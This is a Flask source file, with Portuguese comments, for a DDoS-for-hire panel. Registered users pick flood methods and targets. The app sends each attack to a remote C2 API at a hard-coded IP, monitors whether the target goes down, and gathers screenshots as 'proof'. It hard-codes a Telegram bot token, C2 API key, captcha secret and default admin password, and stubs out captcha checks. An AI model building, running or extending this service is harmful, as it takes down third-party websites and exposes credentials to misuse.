import os
import subprocess
import threading
import time
import requests
from datetime import datetime
import pytz
import uuid
import re
import socket
import hashlib
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, g, abort, send_from_directory
import sqlite3

app = Flask(__name__)
app.secret_key = 'CHAVE_MESTRA_MDZ_C2_ULTIMATE_2026_FIXED'

TURNSTILE_SECRET_KEY = '0x4AAAAAACH6BTusvGu9euyC2S1jU_2HGxY'

TELEGRAM_BOT_TOKEN = '8599727550:AAE2iM7oa7IFONLubC_IlWZ2MCUme2lsqhc'
TELEGRAM_ADMIN_ID = '8576747154'
DB_NAME = 'user_auth.db'
ADMIN_USERNAME = 'admin_master'

UPLOAD_FOLDER = os.path.join(os.getcwd(), 'uploads')
if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# --- API C2 (remoto) ---
API_ATTACK_URL = "http://207.180.203.194/api/attack"
API_KEY = "153eb592-b518-4dee-91ee-b7364c7dfca4"
# metodos aceitos pela API externa
L7_LOCAL_METHODS = ['mdzdd', 'tw-mdz', 'lez', 'rapid', 'tun', 'tls', 'mdzar', 'mdz-by', 'h2', 'hby', 'fury', 'httpkill', 'mdzdestroy', 'mdzfuck', 'mdz-priv']
active_attacks = {}

# --- AUXILIARES ---
def get_real_ip():
    if request.headers.getlist("X-Forwarded-For"): return request.headers.getlist("X-Forwarded-For")[0]
    return request.remote_addr

def send_telegram_log(message):
    def _send():
        try: requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={'chat_id': TELEGRAM_ADMIN_ID, 'text': message, 'parse_mode': 'HTML'}, timeout=5)
        except: pass
    threading.Thread(target=_send).start()

def check_vpn_proxy(ip):
    if ip in ['127.0.0.1', 'localhost', '::1']: return False
    try:
        if get_db().execute("SELECT id FROM blocked_ips WHERE ip_address=?", (ip,)).fetchone(): return True
        r = requests.get(f"https://proxycheck.io/v3/{ip}?vpn=1&asn=1", timeout=3).json()
        if r.get('status') == 'ok' and ip in r:
            d = r[ip]
            is_bad = lambda k: str(d.get(k, 'false')).lower() in ['yes', 'true', '1']
            det = d.get('detections', {})
            if is_bad('vpn') or is_bad('proxy') or is_bad('tor') or is_bad(det.get('vpn')):
                reason = f"Anonimizador: {d.get('provider', 'Unknown')}"
                get_db().execute("INSERT OR IGNORE INTO blocked_ips (ip_address, reason) VALUES (?, ?)", (ip, reason)).connection.commit()
                send_telegram_log(f"🛡️ <b>VPN BARRADA</b>\nIP: {ip}\n{reason}")
                return True
    except: pass
    return False

def verify_turnstile(token):
    return True


def hash_password(p, s=None):
    if not s: s = os.urandom(16)
    else: s = bytes.fromhex(s)
    k = hashlib.pbkdf2_hmac('sha256', p.encode(), s, 100000)
    return s.hex(), k.hex()

def verify_password(stored, p):
    try: s, h = stored.split(':'); return hash_password(p, s)[1] == h
    except: return False

def secure_upload(file):
    if not file: return None
    try:
        if '.' in file.filename:
            ext = file.filename.rsplit('.', 1)[1].lower()
        else:
            ext = 'jpg'
        
        filename = f"{uuid.uuid4()}.{ext}"
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        return filename
    except Exception as e:
        print(f"Erro Upload: {e}")
        return None

# --- BANCO DE DADOS ---
def get_db():
    db = getattr(g, '_database', None)
    if db is None: db = g._database = sqlite3.connect(DB_NAME); db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(e):
    db = getattr(g, '_database', None)
    if db is not None: db.close()

def init_db():
    with app.app_context():
        db = get_db()
        c = db.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password_hash TEXT, is_admin INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0, reg_ip TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        c.execute('''CREATE TABLE IF NOT EXISTS blocked_ips (id INTEGER PRIMARY KEY, ip_address TEXT UNIQUE, reason TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_limits (user_id INTEGER PRIMARY KEY, concurrency INTEGER DEFAULT 0, max_time INTEGER DEFAULT 0, max_rate INTEGER DEFAULT 0)''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_profiles (user_id INTEGER PRIMARY KEY, display_name TEXT, profile_pic_filename TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS attack_limits (id INTEGER PRIMARY KEY, max_time INTEGER, max_rate INTEGER, max_threads INTEGER, cooldown INTEGER)''')
        c.execute('''CREATE TABLE IF NOT EXISTS blocked_sites (id INTEGER PRIMARY KEY, pattern TEXT UNIQUE)''')
        c.execute('''CREATE TABLE IF NOT EXISTS attack_log (id INTEGER PRIMARY KEY, user_id INTEGER, site TEXT, method TEXT, duration INTEGER, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        c.execute('''CREATE TABLE IF NOT EXISTS chat_messages (id INTEGER PRIMARY KEY, user_id INTEGER, message TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        c.execute('''CREATE TABLE IF NOT EXISTS feedback_log (id INTEGER PRIMARY KEY, user_id INTEGER, site_affected TEXT, image_filename TEXT, notes TEXT, is_approved INTEGER DEFAULT 0, submitted_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        
        # Migrations
        c.execute("PRAGMA table_info(users)")
        cols = [col[1] for col in c.fetchall()]
        if 'is_banned' not in cols: c.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")
        if 'reg_ip' not in cols: c.execute("ALTER TABLE users ADD COLUMN reg_ip TEXT")

        if not c.execute("SELECT id FROM users WHERE username=?", (ADMIN_USERNAME,)).fetchone():
            s, h = hash_password('admin12345')
            c.execute("INSERT INTO users (username, password_hash, is_admin) VALUES (?, ?, 1)", (ADMIN_USERNAME, f"{s}:{h}"))
        if not c.execute("SELECT id FROM attack_limits WHERE id=1").fetchone():
            c.execute("INSERT INTO attack_limits (id, max_time, max_rate, max_threads, cooldown) VALUES (1, 120, 1000, 1, 30)")
        db.commit()

# --- MIDDLEWARES ---
@app.before_request
def security():
    if request.endpoint != 'static' and not session.get('ip_verified'):
        if check_vpn_proxy(get_real_ip()): return render_template('blocked_ip.html', ip=get_real_ip()), 403
        else: session['ip_verified'] = True
    
    if 'user_id' in session:
        u = get_db().execute("SELECT * FROM users WHERE id=?", (session['user_id'],)).fetchone()
        if u and u['is_banned']: session.clear(); return render_template('banned.html'), 403

    if 'logged_in' in session:
        g.profile = get_profile()
        g.user_limits_data = load_limits(session['user_id'])
        db = get_db()
        g.real_stats = {
            'attacks_today': db.execute("SELECT COUNT(id) FROM attack_log WHERE date(timestamp) = date('now')").fetchone()[0],
            'running_attacks': len(active_attacks),
            'registered_users': db.execute("SELECT COUNT(id) FROM users").fetchone()[0]
        }

def load_limits(uid):
    db = get_db()
    gl = db.execute("SELECT * FROM attack_limits WHERE id=1").fetchone()
    lim = {'concurrency': gl['max_threads'], 'max_time': gl['max_time'], 'max_rate': gl['max_rate']}
    ul = db.execute("SELECT * FROM user_limits WHERE user_id=?", (uid,)).fetchone()
    if ul:
        if ul['max_time'] > 0: lim['max_time'] = ul['max_time']
        if ul['concurrency'] > 0: lim['concurrency'] = ul['concurrency']
        if ul['max_rate'] > 0: lim['max_rate'] = ul['max_rate']
    return lim

def get_profile():
    db = get_db()
    p = db.execute("SELECT display_name, profile_pic_filename FROM user_profiles WHERE user_id=?", (session['user_id'],)).fetchone()
    if not p:
        db.execute("INSERT OR IGNORE INTO user_profiles (user_id, display_name, profile_pic_filename) VALUES (?, ?, 'default.png')", (session['user_id'], session['username'])).connection.commit()
        p = {'display_name': session['username'], 'profile_pic_filename': 'default.png'}
    
    cnt = db.execute("SELECT COUNT(id) FROM attack_log WHERE user_id=?", (session['user_id'],)).fetchone()[0]
    rank = {'emoji': '🥉', 'title': 'Iniciante'}
    if session.get('is_admin'): rank = {'emoji': '👑', 'title': 'Admin'}
    elif cnt > 500: rank = {'emoji': '💎', 'title': 'Elite'}
    return {**dict(p), 'rank_info': rank}

def login_required(f):
    def wrap(*args, **kwargs):
        if 'logged_in' not in session: return redirect(url_for('login'))
        return f(*args, **kwargs)
    wrap.__name__ = f.__name__
    return wrap

def admin_required(f):
    def wrap(*args, **kwargs):
        if not session.get('is_admin'): abort(403)
        return f(*args, **kwargs)
    wrap.__name__ = f.__name__
    return wrap

# --- ATAQUE via API C2 (NATKMonitor) ---
class NATKMonitor:
    def __init__(self, site, time, rate, threads, method, user_id, port=80):
        self.attack_id = str(uuid.uuid4())[:8]
        self.site = site
        self.port = port
        self.time = int(time)
        self.rate = rate
        self.threads = threads or 1
        self.method = (method or "tls").lower().strip()
        self.user_id = user_id
        self.is_running = True
        self.elapsed = 0
        self.process = None
        self.status_code = 200
        self.target_ip = self.resolve_target_ip(site)
        self.api_message = ""
        self.api_ok = False
        self.node_status = ""

    def resolve_target_ip(self, url):
        try:
            hostname = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
            return socket.gethostbyname(hostname)
        except Exception:
            return "Indisponível"

    def start(self):
        """Dispara o ataque na API C2 remota em vez de binários/scripts locais."""
        params = {
            "key": API_KEY,
            "target": self.site,
            "time": str(self.time),
            "method": self.method,
            "threads": str(self.threads),
        }
        try:
            r = requests.get(API_ATTACK_URL, params=params, timeout=20)
            try:
                data = r.json()
            except Exception:
                data = {"error": "Resposta não-JSON da API", "raw": r.text[:300]}

            if r.status_code == 200 and data.get("status") == "success":
                fb = data.get("feedback") or {}
                self.api_ok = True
                self.api_message = fb.get("message") or "Ogiva injetada com sucesso."
                self.node_status = fb.get("node_status") or "ARMED"
                self.status_code = 200
                threading.Thread(target=self.loop, daemon=True).start()
                try:
                    uname = session.get("username", "?")
                except Exception:
                    uname = "?"
                send_telegram_log(
                    f"🚀 <b>ATAQUE API</b>\nUser: {uname}\nAlvo: {self.site} ({self.target_ip})\n"
                    f"Metodo: {self.method}\nTempo: {self.time}s\nThreads: {self.threads}\n"
                    f"Node: {self.node_status}"
                )
            else:
                # erro da API — propaga para a rota mostrar ao user
                err = data.get("error") or data.get("feedback") or f"HTTP {r.status_code}"
                if isinstance(data.get("feedback"), str) and data.get("error"):
                    err = f"{data.get('error')} — {data.get('feedback')}"
                self.api_ok = False
                self.api_message = str(err)
                self.is_running = False
                raise Exception(str(err))
        except Exception as e:
            self.api_ok = False
            self.is_running = False
            self.api_message = str(e)
            raise

    def loop(self):
        while self.is_running and self.elapsed < self.time:
            time.sleep(1)
            self.elapsed += 1
            if self.elapsed % 5 == 0:
                try:
                    url = self.site if "http" in self.site else "http://" + self.site
                    self.status_code = requests.get(url, timeout=2).status_code
                except Exception:
                    self.status_code = 0
        self.stop()

    def stop(self):
        self.is_running = False
        # API remota não expõe stop — apenas encerra o monitor local
        if self.attack_id in active_attacks:
            active_attacks.pop(self.attack_id, None)

    def info(self):
        return {
            "attack_id": self.attack_id,
            "site": self.site,
            "target_ip": self.target_ip,
            "method": self.method,
            "time_total": self.time,
            "time_elapsed": self.elapsed,
            "time_left": max(0, self.time - self.elapsed),
            "last_status_code": self.status_code,
            "is_running": self.is_running,
            "api_ok": self.api_ok,
            "api_message": self.api_message,
            "node_status": self.node_status,
        }


# --- ROTAS PRINCIPAIS ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form['username'], request.form['password']
        usr = get_db().execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if usr and verify_password(usr['password_hash'], p):
            if usr['is_banned']: return render_template('banned.html'), 403
            session.update({'logged_in': True, 'user_id': usr['id'], 'username': u, 'is_admin': usr['is_admin']})
            return redirect(url_for('index'))
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        u, p = request.form['username'], request.form['password']
        if len(u) < 2 or len(u) > 6: return render_template('register.html', error="Username: 2-6 caracteres.")
        s, h = hash_password(p)
        try:
            get_db().execute("INSERT INTO users (username, password_hash, reg_ip, is_banned) VALUES (?, ?, ?, 0)", (u, f"{s}:{h}", get_real_ip())).connection.commit()
            send_telegram_log(f"🆕 <b>REGISTRO</b>\nUser: {u}\nIP: {get_real_ip()}")
            return redirect(url_for('login'))
        except: return render_template('register.html', error="Usuário existe")
    return render_template('register.html')

@app.route('/', methods=['GET', 'POST'])
@login_required
def index():
    lim = g.user_limits_data
    if request.method == 'POST':
        site, method, t = request.form.get('site'), request.form.get('method'), int(request.form.get('time'))
        
        try:
            if t > lim['max_time']: raise Exception("Tempo limite excedido")
            if sum(1 for a in active_attacks.values() if a.user_id == session['user_id']) >= lim['concurrency']: raise Exception("Slots cheios")
            for b in get_db().execute("SELECT pattern FROM blocked_sites").fetchall():
                if re.search(b['pattern'], site, re.IGNORECASE): raise Exception("Alvo Bloqueado")

            method = (method or "").lower().strip()
            if method not in L7_LOCAL_METHODS:
                raise Exception("Método inválido. Use: " + ", ".join(L7_LOCAL_METHODS))
            threads = request.form.get('threads') or request.form.get('concs') or "1"
            atk = NATKMonitor(site, t, request.form.get('rate'), threads, method, session['user_id'], request.form.get('port'))
            atk.start()  # chama API; levanta Exception se falhar
            active_attacks[atk.attack_id] = atk
            get_db().execute("INSERT INTO attack_log (user_id, site, method, duration) VALUES (?, ?, ?, ?)", (session['user_id'], site, method, t)).connection.commit()
            return redirect(url_for('status_page', attack_id=atk.attack_id))
        except Exception as e: return render_template('index.html', error=str(e), user_plan=lim, local_methods=L7_LOCAL_METHODS, real_stats=g.real_stats)
    return render_template('index.html', user_plan=lim, local_methods=L7_LOCAL_METHODS, real_stats=g.real_stats)

@app.route('/status/<attack_id>')
@login_required
def status_page(attack_id):
    if attack_id not in active_attacks: return redirect(url_for('index'))
    return render_template('status.html', status=active_attacks[attack_id].info())

@app.route('/api/status/<attack_id>')
@login_required
def api_status(attack_id):
    if attack_id not in active_attacks: return jsonify({'is_running': False})
    return jsonify(active_attacks[attack_id].info())

@app.route('/stop/<attack_id>', methods=['POST'])
@login_required
def stop_attack(attack_id):
    if attack_id in active_attacks: active_attacks[attack_id].stop()
    return jsonify({'success': True})

@app.route('/list')
@login_required
def list_attacks():
    return render_template('list.html', active_attacks=[a.info() for a in active_attacks.values() if a.user_id == session['user_id']])

# --- ADMIN ROUTES ---
@app.route('/admin')
@admin_required
def admin_dashboard():
    db = get_db()
    stats = {
        'users': db.execute("SELECT COUNT(id) FROM users").fetchone()[0],
        'online': sum(1 for a in active_attacks.values() if a.is_running),
        'bans': db.execute("SELECT COUNT(id) FROM blocked_ips").fetchone()[0],
        'pending': db.execute("SELECT COUNT(id) FROM feedback_log WHERE is_approved=0").fetchone()[0]
    }
    return render_template('admin_dashboard.html', stats=stats)

@app.route('/admin/limits', methods=['GET', 'POST'])
@admin_required
def admin_limits():
    db = get_db()
    if request.method == 'POST':
        db.execute("UPDATE attack_limits SET max_time=?, max_rate=?, max_threads=?, cooldown=? WHERE id=1",
            (request.form.get('max_time'), request.form.get('max_rate'), request.form.get('max_threads'), request.form.get('cooldown'))).connection.commit()
        return redirect(url_for('admin_limits'))
    return render_template('admin_limits.html', global_limits=db.execute("SELECT * FROM attack_limits WHERE id=1").fetchone())

@app.route('/admin/feedback_review', methods=['GET', 'POST'])
@admin_required
def admin_feedback_review():
    db = get_db()
    if request.method == 'POST':
        fid, act = request.form.get('feedback_id'), request.form.get('action')
        if act == 'approve':
            db.execute("UPDATE feedback_log SET is_approved=1 WHERE id=?", (fid,)).connection.commit()
            send_telegram_log(f"✅ <b>PROVA APROVADA</b> #{fid}")
        else:
            p = db.execute("SELECT image_filename FROM feedback_log WHERE id=?", (fid,)).fetchone()
            if p: 
                try: os.remove(os.path.join(app.config['UPLOAD_FOLDER'], p['image_filename']))
                except: pass
            db.execute("DELETE FROM feedback_log WHERE id=?", (fid,)).connection.commit()
        return redirect(url_for('admin_feedback_review'))
    
    pending = db.execute("SELECT f.id, f.site_affected, f.image_filename, f.notes, u.username as display_name FROM feedback_log f JOIN users u ON f.user_id = u.id WHERE f.is_approved=0").fetchall()
    return render_template('admin_feedback_review.html', pending_feedbacks=pending)

@app.route('/admin/blocklist', methods=['GET', 'POST'])
@admin_required
def admin_blocklist():
    db = get_db()
    if request.method == 'POST':
        if request.form.get('pattern'):
            try: db.execute("INSERT INTO blocked_sites (pattern) VALUES (?)", (request.form.get('pattern'),)).connection.commit()
            except: pass
        elif request.form.get('ip'):
            try: db.execute("INSERT INTO blocked_ips (ip_address, reason) VALUES (?, ?)", (request.form.get('ip'), 'Admin Ban')).connection.commit()
            except: pass
        return redirect(url_for('admin_blocklist'))
    return render_template('admin_blocklist.html', blocked_sites=db.execute("SELECT * FROM blocked_sites").fetchall(), blocked_ips=db.execute("SELECT * FROM blocked_ips").fetchall())

@app.route('/admin/unblock/<string:type>/<int:id>')
@admin_required
def admin_unblock(type, id):
    db = get_db()
    if type == 'site': db.execute("DELETE FROM blocked_sites WHERE id=?", (id,))
    elif type == 'ip': db.execute("DELETE FROM blocked_ips WHERE id=?", (id,))
    db.commit()
    return redirect(url_for('admin_blocklist'))

# --- OUTRAS ROTAS ---
@app.route('/proofs')
@login_required
def proofs_feed():
    return render_template('proof_feed.html', proofs=get_db().execute("SELECT f.site_affected as site, f.image_filename, f.notes as comment, f.submitted_at as timestamp, u.username, u.is_admin FROM feedback_log f JOIN users u ON f.user_id = u.id WHERE f.is_approved=1 ORDER BY f.submitted_at DESC LIMIT 50").fetchall())

@app.route('/proof/submit', methods=['GET', 'POST'])
@login_required
def submit_proof():
    if request.method == 'POST':
        file = request.files.get('image')
        if file and '.' in file.filename:
            fn = secure_upload(file)
            get_db().execute("INSERT INTO feedback_log (user_id, site_affected, image_filename, notes, is_approved) VALUES (?, ?, ?, ?, 0)", (session['user_id'], request.form.get('site'), fn, request.form.get('comment'))).connection.commit()
            send_telegram_log(f"📸 <b>PROVA PENDENTE</b>\nUser: {session['username']}")
            return redirect(url_for('proofs_feed'))
    return render_template('proof_submit.html')

@app.route('/plans')
@login_required
def plans_page():
    return render_template('plans.html')

@app.route('/admin/users')
@admin_required
def admin_users_manager():
    db = get_db()
    q = request.args.get('search')
    if q:
        users = db.execute("SELECT u.*, ul.concurrency, ul.max_time FROM users u LEFT JOIN user_limits ul ON u.id = ul.user_id WHERE u.username LIKE ? ORDER BY u.id DESC", (f'%{q}%',)).fetchall()
    else:
        users = db.execute("SELECT u.*, ul.concurrency, ul.max_time FROM users u LEFT JOIN user_limits ul ON u.id = ul.user_id ORDER BY u.id DESC").fetchall()
    return render_template('admin_users.html', users=users, search_query=q or '')

@app.route('/admin/user/edit/<int:uid>', methods=['POST'])
@admin_required
def admin_edit_user_limits(uid):
    get_db().execute("INSERT INTO user_limits (user_id, concurrency, max_time, max_rate) VALUES (?, ?, ?, ?) ON CONFLICT(user_id) DO UPDATE SET concurrency=excluded.concurrency, max_time=excluded.max_time, max_rate=excluded.max_rate", (uid, request.form.get('concurrency'), request.form.get('max_time'), request.form.get('max_rate'))).connection.commit()
    return redirect(url_for('admin_users_manager'))

@app.route('/admin/user/<int:uid>')
@admin_required
def admin_user_dossier(uid):
    return render_template('admin_user_info.html', target=get_db().execute("SELECT * FROM users WHERE id=?", (uid,)).fetchone(), logs=get_db().execute("SELECT * FROM attack_log WHERE user_id=? ORDER BY timestamp DESC LIMIT 20", (uid,)).fetchall())

@app.route('/admin/ban/<int:uid>')
@admin_required
def admin_ban_user(uid):
    db = get_db()
    db.execute("UPDATE users SET is_banned=1 WHERE id=?", (uid,)).connection.commit()
    db.execute("DELETE FROM chat_messages WHERE user_id=?", (uid,)).connection.commit()
    
    proofs = db.execute("SELECT image_filename FROM feedback_log WHERE user_id=?", (uid,)).fetchall()
    for p in proofs:
        try: os.remove(os.path.join(app.config['UPLOAD_FOLDER'], p['image_filename']))
        except: pass
    db.execute("DELETE FROM feedback_log WHERE user_id=?", (uid,)).connection.commit()

    for aid in list(active_attacks.keys()):
        if active_attacks[aid].user_id == uid: active_attacks[aid].stop()
        
    return redirect(url_for('admin_users_manager'))

@app.route('/admin/unban/<int:uid>')
@admin_required
def admin_unban_user(uid):
    get_db().execute("UPDATE users SET is_banned=0 WHERE id=?", (uid,)).connection.commit()
    return redirect(url_for('admin_users_manager'))

@app.route('/chat')
@login_required
def chat(): return render_template('chat.html')

@app.route('/api/chat/messages')
@login_required
def get_messages():
    return jsonify({'messages': [dict(m) for m in reversed(get_db().execute("SELECT cm.message, cm.timestamp, u.username as display_name, u.is_admin FROM chat_messages cm JOIN users u ON cm.user_id = u.id ORDER BY cm.timestamp DESC LIMIT 50").fetchall())]})

@app.route('/api/chat/send', methods=['POST'])
@login_required
def send_message():
    get_db().execute("INSERT INTO chat_messages (user_id, message) VALUES (?, ?)", (session['user_id'], request.form.get('message'))).connection.commit()
    return jsonify({'success': True})

@app.route('/profile', methods=['GET', 'POST'])
@login_required
def profile_management():
    if request.method == 'POST':
        # Upload de Imagem
        if 'profile_pic' in request.files:
            f = request.files['profile_pic']
            if f.filename: 
                fn = secure_upload(f)
                if fn: get_db().execute("UPDATE user_profiles SET profile_pic_filename=? WHERE user_id=?", (fn, session['user_id'])).connection.commit()
        
        # Atualizar Display Name
        if 'display_name' in request.form:
            dname = request.form['display_name'].strip()
            if dname: get_db().execute("UPDATE user_profiles SET display_name=? WHERE user_id=?", (dname, session['user_id'])).connection.commit()
            
    return render_template('profile_management.html', profile=g.profile, real_stats=g.real_stats)

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

@app.route('/static/uploads/<filename>')
def uploaded_file(filename): return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/admin/password', methods=['POST'])
@login_required
def change_password():
    target = request.form.get('username')
    if not session.get('is_admin') and session['username'] != target: return "403 Forbidden", 403
    s, h = hash_password(request.form.get('new_password'))
    get_db().execute("UPDATE users SET password_hash=? WHERE username=?", (f"{s}:{h}", target)).connection.commit()
    return redirect(request.referrer)

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
